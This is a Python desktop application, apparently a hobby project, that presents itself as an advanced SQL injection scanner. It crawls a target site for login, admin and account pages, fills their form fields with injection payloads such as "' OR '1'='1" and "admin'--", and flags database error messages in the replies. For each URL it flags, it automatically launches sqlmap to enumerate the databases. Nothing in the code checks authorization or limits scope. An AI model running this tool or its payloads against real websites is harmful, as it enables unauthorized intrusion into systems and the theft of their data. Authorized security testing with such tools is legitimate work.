import os
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import threading
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlunparse
from fpdf import FPDF
import subprocess
import time

# Normalize URL helper
def normalize_url(url):
    parsed = urlparse(url)
    normalized = urlunparse((parsed.scheme, parsed.netloc, parsed.path.rstrip('/'), '', '', ''))
    return normalized.lower()

class SQLiScannerApp:
    def __init__(self, root):
        self.root = root
        self.is_dark_mode = True
        self.set_colors()

        self.root.title("Advanced SQLi Scanner with Crawling")
        self.root.geometry("1400x700")
        self.root.configure(bg=self.bg_color)

        # Gradient background canvas
        self.bg_canvas = tk.Canvas(root, highlightthickness=0, bg=self.bg_color)
        self.bg_canvas.pack(fill='both', expand=True)
        self.bg_canvas.place(x=0, y=0, relwidth=1, relheight=1)
        self.gradient_colors_dark = [(138,43,226), (255,20,147), (255,105,180), (199,21,133)]
        self.gradient_colors_light = [(255,182,193), (255,105,180), (255,20,147), (219,112,147)]
        self.gradient_index = 0
        self.animate_gradient()

        # Top frame with title and toggle button
        self.top_frame = tk.Frame(root, bg=self.bg_color)
        self.top_frame.pack(fill='x')

        self.title_label = tk.Label(self.top_frame, text="🦑 ADVANCED SQLi SCANNER",
                                    font=("Lato", 24, "bold"),
                                    bg=self.bg_color, fg=self.fg_color)
        self.title_label.pack(side='left', padx=10, pady=5)

        self.toggle_btn = tk.Button(self.top_frame, text="Switch to Light Mode",
                                    command=self.toggle_mode,
                                    bg=self.btn_bg, fg=self.btn_fg,
                                    font=("Arial", 10, "bold"))
        self.toggle_btn.pack(side='right', padx=10, pady=8)

        # URL input label and entry
        self.url_label = tk.Label(root, text="🔗 Target URL:",
                                  font=("Arial", 12),
                                  bg=self.bg_color, fg=self.fg_color)
        self.url_label.pack(pady=5)

        self.url_entry = tk.Entry(root, width=110, font=("Arial", 11),
                                  bg=self.entry_bg, fg=self.entry_fg,
                                  insertbackground=self.entry_fg)
        self.url_entry.pack(pady=5)

        # Buttons frame 2x2 grid
        self.button_frame = tk.Frame(root, bg=self.bg_color)
        self.button_frame.pack(pady=10)

        btn_font = ("Lato", 18, "bold")

        self.btn_load = tk.Button(self.button_frame, text="📂 Load Payloads", command=self.load_payloads,
                             bg=self.btn_bg, fg=self.btn_fg, font=btn_font, width=25)
        self.btn_scan = tk.Button(self.button_frame, text="🚀 Start Scan (with Crawl)", command=self.start_scan_thread,
                             bg=self.btn_bg, fg=self.btn_fg, font=btn_font, width=25)
        self.btn_pdf = tk.Button(self.button_frame, text="📄 Export to PDF", command=self.export_to_pdf,
                             bg=self.btn_bg, fg=self.btn_fg, font=btn_font, width=25)
        self.btn_db = tk.Button(self.button_frame, text="🧠 Show Database Details", command=self.show_db_details,
                             bg=self.btn_bg, fg=self.btn_fg, font=btn_font, width=25)

        self.btn_load.grid(row=0, column=0, padx=10, pady=5)
        self.btn_pdf.grid(row=0, column=1, padx=10, pady=5)
        self.btn_scan.grid(row=1, column=0, padx=10, pady=5)
        self.btn_db.grid(row=1, column=1, padx=10, pady=5)

        self.animated_buttons = [self.btn_load, self.btn_scan, self.btn_pdf, self.btn_db]
        for btn in self.animated_buttons:
            self.add_button_effects(btn)

        # Progress bar
        self.progress_style = ttk.Style()
        self.progress_style.theme_use("default")
        self.progress_style.configure("TProgressbar", troughcolor=self.bg_color, background=self.btn_bg)
        self.progress = ttk.Progressbar(root, orient="horizontal", length=1200, mode="determinate", style="TProgressbar")
        self.progress.pack(pady=5)

        # Treeview style and setup
        self.style = ttk.Style()
        self.style.theme_use("default")
        self.configure_treeview_style()

        columns = ("Payload", "Action URL", "Vulnerable", "Error Type", "SQLi Type", "Status Code/Error", "Database")
        self.tree = ttk.Treeview(root, columns=columns, show="headings", height=20)
        self.tree.tag_configure("vulnerable", foreground="red")
        self.tree.tag_configure("safe", foreground="green")

        for col in columns:
            self.tree.heading(col, text=col)
            self.tree.column(col, width=250 if col == "Action URL" else (150 if col == "Database" else 200), anchor="w")
        self.tree.pack(pady=10, fill="both", expand=True)

        self.tree.bind("<Map>", lambda e: self.tree.yview_moveto(1.0))
        self.tree.bind("<Double-1>", self.on_double_click)

        self.tooltip = tk.Label(root, text="", background=self.tooltip_bg, fg=self.tooltip_fg, wraplength=500)
        self.tree.bind("<Motion>", self.on_hover)

        # Default payloads and state vars
        self.payloads = ["' OR '1'='1", "admin'--", "' OR 1=1--", "' OR 'a'='a"]
        self.results = []
        self.scanning = False
        self.vulnerable_urls = set()

    # Colors based on theme
    def set_colors(self):
        if self.is_dark_mode:
            self.bg_color = "black"
            self.fg_color = "pink"
            self.btn_bg = "#8B008B"
            self.btn_fg = "white"
            self.entry_bg = "#1f1f1f"
            self.entry_fg = "pink"
            self.tooltip_bg = "pink"
            self.tooltip_fg = "black"
        else:
            self.bg_color = "white"
            self.fg_color = "darkblue"
            self.btn_bg = "#FFC0CB"
            self.btn_fg = "black"
            self.entry_bg = "white"
            self.entry_fg = "black"
            self.tooltip_bg = "lightyellow"
            self.tooltip_fg = "black"

    def toggle_mode(self):
        self.is_dark_mode = not self.is_dark_mode
        self.set_colors()

        # Update UI elements
        self.root.configure(bg=self.bg_color)
        self.bg_canvas.configure(bg=self.bg_color)
        self.top_frame.configure(bg=self.bg_color)
        self.title_label.config(bg=self.bg_color, fg=self.fg_color)

        self.toggle_btn.config(
            text="Switch to Dark Mode" if not self.is_dark_mode else "Switch to Light Mode",
            bg=self.btn_bg, fg=self.btn_fg
        )
        self.toggle_btn.configure(activebackground=self.btn_bg, activeforeground=self.btn_fg)

        self.url_label.config(bg=self.bg_color, fg=self.fg_color)
        self.url_entry.config(bg=self.entry_bg, fg=self.entry_fg, insertbackground=self.entry_fg)

        self.button_frame.config(bg=self.bg_color)

        for btn in self.animated_buttons:
            btn.config(bg=self.btn_bg, fg=self.btn_fg)
            btn.configure(activebackground=self.btn_bg, activeforeground=self.btn_fg)

        self.configure_treeview_style()
        self.tooltip.config(bg=self.tooltip_bg, fg=self.tooltip_fg)

        self.progress_style.configure("TProgressbar", troughcolor=self.bg_color, background=self.btn_bg)
        self.progress.configure(style="TProgressbar")

    def configure_treeview_style(self):
        if self.is_dark_mode:
            self.style.configure("Treeview", background="black", foreground="white", fieldbackground="black", rowheight=25)
            self.style.configure("Treeview.Heading", background="black", foreground="pink", font=("Arial", 11, "bold"))
        else:
            self.style.configure("Treeview", background="white", foreground="black", fieldbackground="white", rowheight=25)
            self.style.configure("Treeview.Heading", background="white", foreground="darkblue", font=("Arial", 11, "bold"))

    def add_button_effects(self, button):
        if self.is_dark_mode:
            hover_bg = "#A020F0"
            active_bg = "#7B0060"
        else:
            hover_bg = "#FFB6C1"
            active_bg = "#FF69B4"

        def on_enter(e):
            button.config(bg=hover_bg)
        def on_leave(e):
            button.config(bg=self.btn_bg)
        def on_press(e):
            button.config(bg=active_bg)
        def on_release(e):
            button.config(bg=hover_bg)

        button.bind("<Enter>", on_enter)
        button.bind("<Leave>", on_leave)
        button.bind("<ButtonPress-1>", on_press)
        button.bind("<ButtonRelease-1>", on_release)

    def animate_gradient(self):
        colors = self.gradient_colors_dark if self.is_dark_mode else self.gradient_colors_light
        c1 = colors[self.gradient_index % len(colors)]
        c2 = colors[(self.gradient_index + 1) % len(colors)]
        steps = 100
        self.bg_canvas.delete("grad")
        canvas_width = self.bg_canvas.winfo_width()
        canvas_height = self.bg_canvas.winfo_height()


        for i in range(steps):
            r = int(c1[0] + (c2[0] - c1[0]) * i / steps)
            g = int(c1[1] + (c2[1] - c1[1]) * i / steps)
            b = int(c1[2] + (c2[2] - c1[2]) * i / steps)
            color = f"#{r:02x}{g:02x}{b:02x}"
            y1 = int(i * (canvas_height / steps))
            y2 = int((i + 1) * (canvas_height / steps))
            self.bg_canvas.create_rectangle(0, y1, canvas_width, y2, outline="", fill=color, tags="grad")
        self.gradient_index = (self.gradient_index + 1) % len(colors)
        self.root.after(100, self.animate_gradient)

    # === Your original methods below === #

    def load_payloads(self):
        file_path = filedialog.askopenfilename(title="Select Payload File", filetypes=[("Text Files", "*.txt")])
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                    self.payloads = [line.strip() for line in lines if line.strip()]
                messagebox.showinfo("Success", f"Loaded {len(self.payloads)} payloads from file.")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load payloads: {str(e)}")

    def export_to_pdf(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF files", "*.pdf")], title="Save scan results as PDF")
        if not file_path:
            return

        pdf = FPDF()
        pdf.set_auto_page_break(auto=True, margin=15)
        pdf.add_page()
        pdf.set_font("Arial", size=12)
        pdf.set_text_color(220, 50, 50)
        pdf.cell(200, 10, txt="SQLi Scan Results", ln=1, align="C")
        pdf.ln(10)

        headers = ["Payload", "Action URL", "Vulnerable", "Error Type", "SQLi Type", "Status/Error"]
        col_widths = [30, 60, 25, 35, 35, 50]  # Ensure it matches number of columns in results

        def draw_header():
            pdf.set_font("Arial", style="B", size=10)
            for i, header in enumerate(headers):
                width = col_widths[i] if i < len(col_widths) else 40
                pdf.cell(width, 10, header, border=1)
            pdf.ln()
            pdf.set_font("Arial", size=10)

        draw_header()

        for row in self.results:
            line_wrappings = []
            max_lines = 0

            for i, item in enumerate(row[:len(col_widths)]):
                text = str(item)
                width = col_widths[i]
                lines = pdf.multi_cell(width, 5, text, border=0, split_only=True)
                line_wrappings.append(lines)
                max_lines = max(max_lines, len(lines))

            row_height = max_lines * 5

            if pdf.get_y() + row_height > 270:
                pdf.add_page()
                draw_header()

            y_start = pdf.get_y()
            x_start = pdf.get_x()

            # Draw each cell by capturing Y separately to keep boxes aligned
            for line_index in range(max_lines):
                x = pdf.get_x()
                for i in range(len(col_widths)):
                    width = col_widths[i]
                    lines = line_wrappings[i]
                    text_line = lines[line_index] if line_index < len(lines) else ""
                    pdf.multi_cell(width, 5, text_line, border=0, align='L')
                    x += width
                    pdf.set_xy(x, pdf.get_y() - 5)
                pdf.ln(5)

            # Redraw cell borders perfectly
            pdf.set_xy(x_start, y_start)
            for i in range(len(col_widths)):
                width = col_widths[i]
                pdf.rect(x_start, y_start, width, row_height)
                x_start += width

            pdf.set_y(y_start + row_height)

        try:
            pdf.output(file_path)
            messagebox.showinfo("Success", f"Results saved to:\n{file_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save PDF: {str(e)}")

                                 
    def run_sqlmap_get_dbs(self, url):
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            sqlmap_path = os.path.join(script_dir,"sqlmap-master","sqlmap-master","sqlmap.py")
            result = subprocess.Popen([
                "python", sqlmap_path, "-u", url, "--batch", "--dbs"
            ], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            dbs = []
            for line in iter(result.stdout.readline, ''):
                line = line.strip()
                if line.startswith("[*]"):
                    dbs.append(line.replace("[*]", "").strip())

            result.stdout.close()
            result.wait()
            return dbs if dbs else ["No databases found."]
        except Exception as e:
            return [f"Error: {e}"]

    def show_db_details(self):
        selected = self.tree.focus()
        if not selected:
            messagebox.showwarning("No Selection", "Please select a row with a vulnerable URL.")
            return

        values = self.tree.item(selected, 'values')
        url = values[1]
        dbs = self.run_sqlmap_get_dbs(url)
        messagebox.showinfo("Database Details", "\n".join(dbs))

    def on_double_click(self, event):
        self.show_db_details()

    def run_sqlmap(self, url):
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            sqlmap_path = os.path.join(script_dir,"sqlmap-master","sqlmap-master","sqlmap.py")
            subprocess.run(["python", sqlmap_path, "-u", url, "--batch", "--dbs"], shell=True)
        except Exception as e:
            print("SQLMap Error:", e)

    def start_scan_thread(self):
        threading.Thread(target=self.start_scan, daemon=True).start()

    def crawl_site(self, base_url, max_pages=30):
        visited = set()
        to_visit = [base_url]

        while to_visit and len(visited) < max_pages:
            url = to_visit.pop()
            normalized_url = normalize_url(url)
            if normalized_url in visited:
                continue
            visited.add(normalized_url)

            try:
                response = requests.get(url, timeout=10)
                soup = BeautifulSoup(response.text, "html.parser")
                for link in soup.find_all("a", href=True):
                    full_url = urljoin(url, link['href'])
                    norm_link = normalize_url(full_url)
                    if (norm_link not in visited and norm_link not in to_visit and any(k in norm_link for k in ["login", "signin", "admin", "account", "auth", "user"])):
                        to_visit.append(full_url)
            except:
                continue

        return visited

    def start_scan(self):
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a target URL.")
            return

        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url

        self.scanning = True
        self.results.clear()
        self.vulnerable_urls.clear()
        self.tree.delete(*self.tree.get_children())
        self.progress["value"] = 0

        crawled_links = self.crawl_site(url)
        total_payloads = len(self.payloads)
        self.progress["maximum"] = total_payloads * len(crawled_links)

        for page_url in crawled_links:
            forms = self.find_forms(page_url)
            if not forms:
                continue

            for form in forms:
                form_details = self.extract_form_details(form, page_url)
                action_url = form_details["action"]

                for payload in self.payloads:
                    if not self.scanning:
                        break

                    data = {}
                    for input_field in form_details["inputs"]:
                        if input_field["type"] in ["text", "password", "search", "email", "url"]:
                            data[input_field["name"]] = payload
                        else:
                            data[input_field["name"]] = input_field["value"]

                    try:
                        if form_details["method"] == "post":
                            response = requests.post(action_url, data=data, timeout=10)
                        else:
                            response = requests.get(action_url, params=data, timeout=10)

                        if self.is_sql_injection(response.text):
                            vulnerable = "Yes"
                            error_category, sqli_type, db_type = self.extract_error_info(response.text)
                            if action_url not in self.vulnerable_urls:
                                self.vulnerable_urls.add(action_url)
                                threading.Thread(target=self.run_sqlmap, args=(action_url,), daemon=True).start()
                        else:
                            vulnerable = "No"
                            error_category, sqli_type, db_type = "-", "-", "-"

                        result = (payload, action_url, vulnerable, error_category, sqli_type, response.status_code, db_type)
                    except Exception as e:
                        result = (payload, action_url, "No", "Network Error", "-", str(e), "-")

                    self.results.append(result)

                    def insert_row(res):
                        tag = "vulnerable" if res[2] == "Yes" else "safe"
                        self.tree.insert("", "end", values=res, tags=(tag,))
                    self.root.after(0, lambda r=result: insert_row(r))
                    self.root.after(0, lambda: self.tree.yview_moveto(1.0))
                    self.root.after(0, self.progress.step)

        self.scanning = False
        self.progress["value"] = self.progress["maximum"]
        vuln_count = sum(1 for r in self.results if r[2] == "Yes")
        messagebox.showinfo("Scan Complete", f"Scan complete!\n\nTotal payloads tested: {total_payloads}\nVulnerabilities found: {vuln_count}")

    def on_hover(self, event):
        item = self.tree.identify_row(event.y)
        column = self.tree.identify_column(event.x)
        if item and column == "#2":
            url_value = self.tree.item(item, "values")[1]
            x, y, _, _ = self.tree.bbox(item, column)
            self.tooltip.place(x=event.x_root - self.root.winfo_rootx() + 20, y=event.y_root - self.root.winfo_rooty() + 20)
            self.tooltip.config(text=url_value)
        else:
            self.tooltip.place_forget()

    def find_forms(self, url):
        try:
            res = requests.get(url, timeout=10)
            soup = BeautifulSoup(res.text, "html.parser")
            return soup.find_all("form")
        except:
            return []

    def extract_form_details(self, form, page_url):
        details = {}
        action = form.attrs.get("action")
        if not action:
            action = page_url
        else:
            action = urljoin(page_url, action)
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text").lower()
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            if input_name:
                inputs.append({"type": input_type, "name": input_name, "value": input_value})
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def is_sql_injection(self, response_text):
        errors = [
            "you have an error in your sql syntax;",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "syntax error",
            "mysql_fetch_array()",
            "mysql_num_rows()",
            "mysql_fetch_assoc()",
            "mysql_query()",
            "pg_query()",
            "pg_fetch_array()",
            "syntax error in query",
            "sqlstate"
        ]
        lower_text = response_text.lower()
        return any(error in lower_text for error in errors)

    def extract_error_info(self, response_text):
        # Basic categorization
        if "mysql" in response_text.lower():
            return ("MySQL Error", "Boolean-based", "MySQL")
        elif "syntax error" in response_text.lower() or "sql syntax" in response_text.lower():
            return ("Syntax Error", "Error-based", "-")
        elif "unclosed quotation" in response_text.lower():
            return ("Unclosed Quotation", "Error-based", "-")
        elif "pg_query" in response_text.lower():
            return ("PostgreSQL Error", "Boolean-based", "PostgreSQL")
        else:
            return ("Unknown", "-", "-")

# Splash screen with shapes and loading animation + scan prompt popup
def show_intro_with_shapes(root, after_animation_callback):
    splash = tk.Toplevel(root)
    splash.attributes("-fullscreen", True)
    splash.configure(bg="black")
    splash.overrideredirect(True)

    canvas = tk.Canvas(splash, bg="black", highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    w = splash.winfo_screenwidth()
    h = splash.winfo_screenheight()
    center_x = w // 2
    center_y = h // 2
    size = 60

    triangle = canvas.create_polygon(center_x - size, center_y + size,
                                     center_x, center_y - size,
                                     center_x + size, center_y + size,
                                     fill="black", outline="white", width=5)

    square = canvas.create_rectangle(center_x - 200, center_y - 60,
                                     center_x - 120, center_y + 60,
                                     outline="white", width=5)

    circle = canvas.create_oval(center_x + 120, center_y - 60,
                               center_x + 200, center_y + 60,
                               outline="white", width=5)

    canvas.create_text(center_x, center_y + 130,
                       text="🔍 Loading Advanced SQLi Scanner...",
                       fill="pink", font=("Lato", 24, "bold"))

    def animate():
        for _ in range(30):
            canvas.move(triangle, 0, -1)
            canvas.move(square, 0, 1)
            canvas.move(circle, 0, -1)
            splash.update()
            time.sleep(0.03)

    def custom_popup():
        popup = tk.Toplevel(splash)
        popup.configure(bg="black")
        popup.geometry("400x180+{}+{}".format(center_x - 200, center_y - 90))
        popup.attributes("-topmost", True)
        popup.lift()

        label = tk.Label(popup, text="Do you want to start the scan?", font=("Arial", 14, "bold"),
                         bg="black", fg="pink")
        label.pack(pady=30)

        def on_yes():
            popup.destroy()
            splash.destroy()
            after_animation_callback()

        def on_no():
            popup.destroy()
            splash.destroy()
            root.quit()

        btn_frame = tk.Frame(popup, bg="black")
        btn_frame.pack(pady=10)

        yes_btn = tk.Button(btn_frame, text="YES", command=on_yes,
                            bg="pink", fg="black", font=("Arial", 12, "bold"), width=10)
        no_btn = tk.Button(btn_frame, text="NO", command=on_no,
                           bg="gray", fg="white", font=("Arial", 12, "bold"), width=10)
        yes_btn.grid(row=0, column=0, padx=20)
        no_btn.grid(row=0, column=1, padx=20)

        popup.transient(splash)
        popup.grab_set()
        popup.focus_force()
        splash.wait_window(popup)

    def after_anim():
        custom_popup()

    def start_all():
        animate()
        time.sleep(3)
        after_anim()

    threading.Thread(target=start_all).start()

def main():
    root = tk.Tk()
    app = SQLiScannerApp(root)
    root.withdraw()

    def show_app():
        root.deiconify()

    show_intro_with_shapes(root, show_app)
    root.mainloop()

if __name__ == "__main__":
    main()
